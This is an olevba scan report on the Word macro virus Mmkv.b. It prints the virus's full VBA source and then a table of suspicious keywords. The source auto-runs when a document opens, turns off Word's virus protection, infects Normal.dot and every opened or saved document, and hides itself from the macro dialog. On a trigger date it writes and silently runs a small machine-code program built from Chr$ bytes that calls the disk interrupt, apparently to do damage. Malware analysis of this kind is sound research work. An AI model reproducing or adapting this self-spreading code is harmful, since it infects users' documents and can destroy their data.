olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mmkv.b-d76552e6f0e7d76e3144fedb7855aa1f473d452c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mmkv.b-d76552e6f0e7d76e3144fedb7855aa1f473d452c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MMKV.bas 
in file: Virus.MSWord.Mmkv.b-d76552e6f0e7d76e3144fedb7855aa1f473d452c - OLE stream: 'Macros/VBA/MMKV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WinDir As String
Public DataDot As Boolean

Sub AutoExec()
AutoOpen
End Sub
Sub AutoOpen()
If Year(Now) = 2000 Then
        f = FreeFile
        Open "c:\end.com" For Output As #f
        Print #f, Chr$(184) & Chr$(16) & Chr$(5) & Chr$(185) & Chr$(9) & Chr$(0) & Chr$(186) & Chr$(128) & Chr$(0) & Chr$(187) & Chr$(0) & Chr$(16) & Chr$(205) & Chr$(19) & Chr$(205) & Chr$(32)
        Close
        Shell "c:\end.com", vbHide
        MsgBox "Welcome To Y2K", 0, "MK-Words By MMK 1999"
End If
If Day(Now) = 3 Then MsgBox "Y2K is coming soon...", 0, "MK-Words By MMK 1999"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Copy_Tmp
Copy_Vir
End Sub
Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument, "MMKV", wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub FileOpen()
fa = Dialogs(wdDialogFileOpen).Show
If fa = "" Then GoTo asa
Copy_Vir
asa:
ActiveDocument.Save
End Sub
Sub ToolsMacro()
End Sub
Find_Win
NormalTemplate.VBProject.VBComponents("MMKV").Export WinDir + "\SYSTEM\" + "WINMK.SYS"
Application.OrganizerDelete NormalTemplate.FullName, "MMKV", wdOrganizerObjectProjectItems
While Dialogs(wdDialogToolsMacro).Display
Wend
NormalTemplate.VBProject.VBComponents.import WinDir + "\SYSTEM\" + "WINMK.SYS"
Kill WinDir + "\SYSTEM\" + "WINMK.SYS"
End Sub
Sub FileSave()
If ActiveDocument.FullName = "" Then Dialogs(wdDialogFileSaveAs).Show
Copy_Vir
ActiveDocument.Save
End Sub
Sub viewvbcode()
End Sub
Sub Find_Win()
Close
Dim WD As String
On Error GoTo Err_F
f = FreeFile
Open "c:\msdos.sys" For Input As #f
Do Until EOF(f)
Line Input #f, WD
If Left(UCase(WD), 7) = "WINDIR=" Then
    L = Len(WD)
    WinDir = UCase$(Mid$(WD, 8, L))
End If
Loop
GoTo END_S
Err_F:
WinDir = ""
END_S:
Close #f
End Sub
Sub Copy_Vir()
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "MMKV" Then GoTo INFECTED
    Next
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "MMKV", wdOrganizerObjectProjectItems
Add_Com
ActiveDocument.Save
INFECTED:
End Sub
Sub Copy_Tmp()
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "MMKV" Then GoTo INFECTED
    Next
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "MMKV", wdOrganizerObjectProjectItems
ActiveDocument.Save
INFECTED:
Copy_Vir
Add_Com
ActiveDocument.Save
End Sub
Private Sub Add_Com()
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V1) By MMK 1999"
            .Execute
        End With
End Sub
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

